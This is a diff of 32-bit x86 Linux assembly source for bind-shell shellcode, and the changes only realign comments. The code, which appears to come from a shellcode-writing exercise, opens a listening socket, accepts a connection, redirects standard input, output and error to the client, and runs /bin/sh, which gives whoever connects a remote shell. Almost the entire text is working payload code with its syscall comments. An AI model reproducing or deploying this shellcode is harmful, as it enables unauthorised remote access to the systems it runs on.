@@ -19,7 +19,7 @@ _start:
 	mov al, 0x66			; SYS_SOCKETCALL = 102
 	mov esi, eax			; Save for later (to reduce shellcode length)
 	xor ebx, ebx
-	mov bl, 0x1				; int call => SYS_SOCKET = 0x1
+	mov bl, 0x1			; int call => SYS_SOCKET = 0x1
 	mov ecx, esp			; unsigned long *args => arguments for socket()
 	int 0x80
 
@@ -36,7 +36,7 @@ _start:
 	push dword eax			; int sockfd => return value from SYS_SOCKET
 
 	mov eax, esi			; SYS_SOCKETCALL = 102
-	mov bl, 0xe				; int call => SYS_SETSOCKOPT = 0xe
+	mov bl, 0xe			; int call => SYS_SETSOCKOPT = 0xe
 	mov ecx, esp			; unsigned long *args => arguments for setsockopt()
 	int 0x80
 
@@ -45,7 +45,7 @@ _start:
 	;       socklen_t addrlen);
 
 	; struct sockaddr_in {
-	;     short sin_family;			-- 2 bytes, AF_INET
+	;     short sin_family;		-- 2 bytes, AF_INET
 	;     unsigned short sin_port;  -- 2 bytes, htons(<PORT>)
 	;     struct in_addr;           -- 4 bytes, INADDR_ANY (0x00000000)
 	;     char sin_zero[8];         -- 8 bytes, 0x00000000 0x00000000
@@ -70,8 +70,8 @@ _start:
 	push dword edi			; int sockfd => return value from SYS_SOCKET
 
 	mov eax, esi			; SYS_SOCKETCALL = 102
-							; int call => SYS_BIND = 0x2 
-							; EBX is already 0x2 from above (reducing length)
+					; int call => SYS_BIND = 0x2 
+					; EBX is already 0x2 from above (reducing length)
 	mov ecx, esp			; unsigned long *args => arguments for bind()
 	int 0x80
 
@@ -83,7 +83,7 @@ _start:
 	push dword edi			; int sockfd => return value from SYS_SOCKET
 
 	mov eax, esi			; SYS_SOCKETCALL = 102
-	mov bl, 0x4				; int call => SYS_LISTEN = 0x4
+	mov bl, 0x4			; int call => SYS_LISTEN = 0x4
 	mov ecx, esp			; unsigned long *args => arguments for listen()
 	int 0x80
 
@@ -100,37 +100,37 @@ _start:
 	push dword edi			; int sockfd => return value from SYS_SOCKET
 
 	mov eax, esi			; SYS_SOCKETCALL = 102
-	mov bl, 0x5				; int call => SYS_ACCEPT = 0x5
+	mov bl, 0x5			; int call => SYS_ACCEPT = 0x5
 	mov ecx, esp			; unsigned long *args => arguments for accept()
 	int 0x80
 
 	mov ebx, eax			; Store the return value (client fd) in EBX,
-							; since it will be used in the dup2 calls.
+					; since it will be used in the dup2 calls.
 
 	; dup2 (int oldfd, int newfd);
 
 	xor eax, eax
 	mov al, 0x3f			; SYS_DUP2 = 0x3f
-							; int newfd => return value from SYS_ACCEPT
+					; int newfd => return value from SYS_ACCEPT
 	xor ecx, ecx			; int oldfd => STDIN = 0x0
 	int 0x80
 
 	; dup2 (int oldfd, int newfd);
 
-							; Assuming success, result will be 0x0, so we
-							; don't need to clear EAX
+					; Assuming success, result will be 0x0, so we
+					; don't need to clear EAX
 	mov al, 0x3f			; SYS_DUP2 = 0x3f
-							; int newfd => return value from SYS_ACCEPT
-	inc ecx					; int oldfd => STDOUT = 0x1
+					; int newfd => return value from SYS_ACCEPT
+	inc ecx				; int oldfd => STDOUT = 0x1
 	int 0x80
 
 	; dup2 (int oldfd, int newfd);
 
-							; Assuming success, result will be 0x1, so we
-							; don't need to clear EAX
+					; Assuming success, result will be 0x1, so we
+					; don't need to clear EAX
 	mov al, 0x3f			; SYS_DUP2 = 0x3f
-							; int newfd => return value from SYS_ACCEPT
-	inc ecx					; int oldfd => STDERR = 0x2
+					; int newfd => return value from SYS_ACCEPT
+	inc ecx				; int oldfd => STDERR = 0x2
 	int 0x80
 
 	; execve (const char *pathname, char *const argv[],
@@ -146,5 +146,5 @@ _start:
 	mov edx, esp			; char *const envp[] => NULL
 	push ebx,
 	mov ecx, esp			; char *const argv[] => *{*"//bin/sh"}
-	mov al, 0xb				; SYS_EXECVE = 0xb
+	mov al, 0xb			; SYS_EXECVE = 0xb
 	int 0x80
